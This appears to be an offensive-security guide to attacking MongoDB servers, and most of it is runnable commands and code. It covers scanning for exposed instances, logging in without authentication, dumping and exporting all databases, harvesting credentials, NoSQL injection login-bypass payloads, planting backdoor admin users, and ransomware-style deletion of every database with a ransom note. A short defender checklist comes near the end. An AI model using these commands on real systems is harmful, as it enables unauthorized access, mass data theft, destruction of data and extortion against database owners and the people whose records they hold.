# Port 27017/27018 - MongoDB - Complete Attack Guide

## Overview

**Protocol**: MongoDB (NoSQL Database)
**Ports**: 27017 (default), 27018 (sharded cluster), 27019 (config server)
**Transport**: TCP
**Encryption**: Optional (TLS/SSL)
**Authentication**: Optional (SCRAM, x.509, LDAP, Kerberos), often none

## Attack Objectives

- **Unauthenticated Access**: Connect without credentials
- **Data Extraction**: Dump all databases and collections
- **Data Modification**: Insert, update, delete data
- **Command Execution**: Via server-side JavaScript
- **Ransomware**: Delete data and demand payment
- **Information Gathering**: Extract sensitive documents
- **NoSQL Injection**: Exploit web app MongoDB queries

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect MongoDB Service**
```bash
# Quick scan
nmap -p 27017,27018,27019 192.168.1.100

# Service version
nmap -p 27017 -sV 192.168.1.100

# MongoDB scripts
nmap -p 27017 --script mongodb-* 192.168.1.100

# Network-wide discovery
nmap -p 27017 192.168.1.0/24 --open

# Shodan search
shodan search "product:MongoDB"
```

**1.2 Banner Grabbing**
```bash
# Using netcat
echo -e '\x3a\x00\x00\x00\xa7\x37\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00test.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff\x1b\x00\x00\x00\x01serverStatus\x00\x00\x00\x00\x00\x00\x00\xf0\x3f\x00' | nc 192.168.1.100 27017

# Using Nmap
nmap -p 27017 --script mongodb-info 192.168.1.100

# Get version
nmap -p 27017 --script mongodb-databases 192.168.1.100
```

**1.3 Check for Authentication**
```bash
# Using mongo client
mongo --host 192.168.1.100 --port 27017

# If connects without password = unauthenticated!

# Test connection
mongo 192.168.1.100:27017
> show dbs

# Using mongosh (MongoDB 5.0+)
mongosh --host 192.168.1.100 --port 27017
```

### Phase 2: Unauthenticated Access

**2.1 Test for No Authentication**
```bash
# Connect without credentials
mongo --host 192.168.1.100

# List databases
> show dbs

# If successful = no authentication required!

# Using Nmap
nmap -p 27017 --script mongodb-databases,mongodb-info 192.168.1.100

# Using Metasploit
use auxiliary/scanner/mongodb/mongodb_login
set RHOSTS 192.168.1.100
set BLANK_PASSWORDS true
run
```

**2.2 Default Credentials**
```bash
# MongoDB often has no default credentials
# But some installations might use:

# Common defaults
admin:admin
root:root
mongodb:mongodb

# Try connecting
mongo --host 192.168.1.100 -u admin -p admin --authenticationDatabase admin
```

### Phase 3: Enumeration

**3.1 Database Enumeration**
```bash
# Connect
mongo 192.168.1.100:27017

# List all databases
> show dbs

# Switch to database
> use database_name

# List collections (tables)
> show collections

# Count documents
> db.collection_name.count()

# List all collections in all databases
> db.adminCommand('listDatabases').databases.forEach(function(database){
    db = db.getSiblingDB(database.name);
    print("Database: " + database.name);
    db.getCollectionNames().forEach(function(collection){
        print("  Collection: " + collection);
    });
});
```

**3.2 Data Extraction**
```bash
# View all documents in collection
> db.collection_name.find()

# Pretty print
> db.collection_name.find().pretty()

# Limit results
> db.collection_name.find().limit(10)

# Query specific fields
> db.users.find({}, {username:1, password:1, email:1})

# Search for sensitive data
> db.users.find({role: "admin"})
> db.users.find({username: "admin"})
> db.creditcards.find()
> db.passwords.find()
```

**3.3 Export Data**
```bash
# Using mongodump (best for full backup)
mongodump --host 192.168.1.100 --port 27017 --out /tmp/mongodb_dump

# Dump specific database
mongodump --host 192.168.1.100 --db database_name --out /tmp/dump

# Dump specific collection
mongodump --host 192.168.1.100 --db database_name --collection users --out /tmp/dump

# Using mongoexport (JSON/CSV format)
mongoexport --host 192.168.1.100 --db database_name --collection users --out users.json

# Export as CSV
mongoexport --host 192.168.1.100 --db database_name --collection users --type=csv --fields=username,email,password --out users.csv

# Export all databases (script)
for db in $(mongo 192.168.1.100:27017 --quiet --eval 'db.adminCommand("listDatabases").databases.forEach(function(d){print(d.name)})'); do
  mongodump --host 192.168.1.100 --db $db --out /tmp/dump_all/$db
done
```

**3.4 User Enumeration**
```bash
# List users
> use admin
> db.system.users.find()

# Get current user
> db.runCommand({connectionStatus : 1})

# List roles
> db.getRoles({showPrivileges: true})

# Find admin users
> db.system.users.find({roles: {$elemMatch: {role: "root"}}})
```

### Phase 4: Data Modification

**4.1 Insert Malicious Data**
```bash
# Insert backdoor admin user
> use database_name
> db.users.insert({
    username: "backdoor",
    password: "$2a$10$hash_here",
    email: "backdoor@evil.com",
    role: "admin",
    privileges: ["all"]
})

# Verify insertion
> db.users.find({username: "backdoor"})
```

**4.2 Update Existing Data**
```bash
# Change admin password
> db.users.update(
    {username: "admin"},
    {$set: {password: "new_hash"}}
)

# Elevate user privileges
> db.users.update(
    {username: "lowpriv"},
    {$set: {role: "admin"}}
)

# Add yourself to admin group
> db.users.update(
    {username: "attacker"},
    {$set: {groups: ["admin", "superuser"]}}
)
```

**4.3 Delete Data (Ransomware)**
```bash
# Drop collection
> db.important_data.drop()

# Drop database
> use critical_db
> db.dropDatabase()

# Delete all documents
> db.collection_name.remove({})

# Ransomware note
> db.PLEASE_READ.insert({
    message: "Your data has been encrypted. Pay 1 BTC to recover.",
    bitcoin_address: "1ABC...",
    email: "ransom@evil.com"
})

# Delete everything (destructive!)
> db.adminCommand('listDatabases').databases.forEach(function(d){
    db.getSiblingDB(d.name).dropDatabase();
});
```

### Phase 5: Command Execution

**5.1 Server-Side JavaScript Execution**
```bash
# Execute JavaScript on server
> db.eval("function() { return 'test'; }")

# Get OS information
> db.serverStatus()

# Execute system command (if enabled - rare)
# MongoDB 4.2+ removed db.eval() for security

# Using $where (older versions)
> db.users.find({$where: "this.username == 'admin'"})

# Inject code via $where
> db.users.find({$where: "sleep(5000)"})  # Time-based detection
```

**5.2 NoSQL Injection (Web Applications)**
```bash
# Login bypass
# Original query: db.users.find({username: "admin", password: "password"})

# Inject in username field
username[$ne]=1&password[$ne]=1
# Becomes: db.users.find({username: {$ne: 1}, password: {$ne: 1}})
# Always true!

# Other payloads
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$ne": "wrong"}}

# Extract data
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
# Enumerate usernames character by character

# Using NoSQLMap
python nosqlmap.py -u "http://target.com/login" --data "username=admin&password=test"
```

**5.3 Boolean-Based Blind NoSQL Injection**
```bash
# Test if username starts with 'a'
{"username": {"$regex": "^a.*"}, "password": "test"}

# Automated extraction
for char in 'abcdefghijklmnopqrstuvwxyz':
    payload = {"username": {"$regex": f"^{char}.*"}, "password": "test"}
    # Test payload
    # If true, username starts with that character
```

### Phase 6: Post-Exploitation

**6.1 Credential Harvesting**
```bash
# Extract password hashes
> db.users.find({}, {username:1, password:1})

# Look for API keys
> db.config.find({}, {api_key:1, secret:1})

# Search all databases for passwords
> db.adminCommand('listDatabases').databases.forEach(function(database){
    db = db.getSiblingDB(database.name);
    db.getCollectionNames().forEach(function(collection){
        var docs = db[collection].find({}, {password:1, passwd:1, pwd:1, api_key:1, secret:1, token:1}).toArray();
        if (docs.length > 0) {
            print("Found in: " + database.name + "." + collection);
            printjson(docs);
        }
    });
});
```

**6.2 Persistence**
```bash
# Create backdoor admin user
> use admin
> db.createUser({
    user: "backdoor",
    pwd: "SecurePass123!",
    roles: [{role: "root", db: "admin"}]
})

# Add SSH key to application if stored in MongoDB
> db.users.update(
    {username: "admin"},
    {$set: {ssh_keys: ["ssh-rsa AAAA..."]}}
)
```

**6.3 Lateral Movement**
```bash
# Look for credentials to other services
> db.servers.find({}, {hostname:1, username:1, password:1})
> db.databases.find({}, {host:1, user:1, pass:1})
> db.api_connections.find({}, {endpoint:1, api_key:1})

# Try extracted credentials on other services
# SSH, MySQL, Redis, etc.
```

### Phase 7: Advanced Attacks

**7.1 Aggregation Pipeline Injection**
```bash
# Abuse $lookup to join collections
db.users.aggregate([
    {$lookup: {
        from: "passwords",
        localField: "user_id",
        foreignField: "_id",
        as: "credentials"
    }}
])

# Extract data via aggregation
db.users.aggregate([
    {$match: {}},
    {$project: {username:1, password:1, email:1}}
])
```

**7.2 Replica Set Attacks**
```bash
# If replica set configured
# Connect to secondary (may have weaker security)
mongo 192.168.1.101:27017

# Check replica set status
> rs.status()

# Find primary
> db.isMaster()

# Read from secondary (if allowed)
> rs.slaveOk()
> db.sensitive_data.find()
```

## Bypass Techniques

### Bypassing Authentication

**Method 1: No Auth (Default)**
```bash
# Most MongoDB instances have no auth
mongo 192.168.1.100:27017
```

**Method 2: Bind IP Bypass**
```bash
# If bound to localhost
# SSH tunnel
ssh -L 27018:127.0.0.1:27017 user@192.168.1.100
mongo localhost:27018
```

**Method 3: Old Version Exploits**
```bash
# CVE-2013-1892, CVE-2013-2132
# Authentication bypass in older MongoDB
```

## Information Extraction

**Critical Commands**:
```javascript
// List databases
show dbs

// List collections
show collections

// Count documents
db.collection.count()

// Find all documents
db.collection.find()

// Server status
db.serverStatus()

// Current operations
db.currentOp()

// Database stats
db.stats()
```

## Security Recommendations

**For Defenders**:
1. **Enable Authentication** - Always require credentials
2. **Bind to Localhost** - Don't expose to internet
3. **Firewall** - Block port 27017 externally
4. **TLS/SSL** - Encrypt connections
5. **Strong Passwords** - Complex, long passwords
6. **Role-Based Access Control** - Least privilege
7. **Disable db.eval()** - Prevent code execution
8. **Regular Backups** - But secure them
9. **Update MongoDB** - Patch vulnerabilities
10. **Monitor Access** - Log all connections

## Common Mistakes

**Attacker Mistakes**:
1. Not checking for no-auth first
2. Forgetting to export data before ransomware
3. Not searching all databases
4. Missing NoSQL injection opportunities

**Defender Mistakes**:
1. **No authentication** - Most critical
2. **Exposed to internet** - Port 27017 public
3. **Default configuration** - No security settings
4. **No backups** - Vulnerable to ransomware
5. **No monitoring** - Attacks go undetected
6. **Running as root** - Privilege escalation risk

## Practical Attack Scenario

```bash
# Discovery
nmap -p 27017 192.168.1.0/24 --open
# Found: 192.168.1.50

# Test authentication
mongo 192.168.1.50:27017
# Connected without password!

# List databases
> show dbs
# admin, customers, orders, products

# Enumerate customers
> use customers
> db.users.count()
# 10,000 users

# Extract admin credentials
> db.users.find({role: "admin"})
# Found 5 admin accounts with password hashes

# Dump all data
mongodump --host 192.168.1.50 --out /tmp/mongodb_loot
# Exported 2 GB of data

# Found in data:
# - 10,000 customer records
# - Credit card information (PCI violation!)
# - API keys to AWS
# - Database credentials to MySQL
# - Employee SSNs

# Total compromise + data breach
```

## Tools Summary

**Best Tool for Each Task**:
- **Discovery**: Nmap, Shodan
- **Enumeration**: mongo client, mongosh
- **Data Extraction**: mongodump, mongoexport
- **NoSQL Injection**: NoSQLMap, Burp Suite
- **Brute Force**: Metasploit
- **Automation**: Python pymongo library

## Related Attacks

- **Port 80/443**: NoSQL injection in web apps
- **Port 6379 (Redis)**: Similar NoSQL attacks
- **Ransomware**: MongoDB ransom attacks very common
- **Data Breach**: GDPR/PCI violations

---

**Last Updated**: 2026-06-16
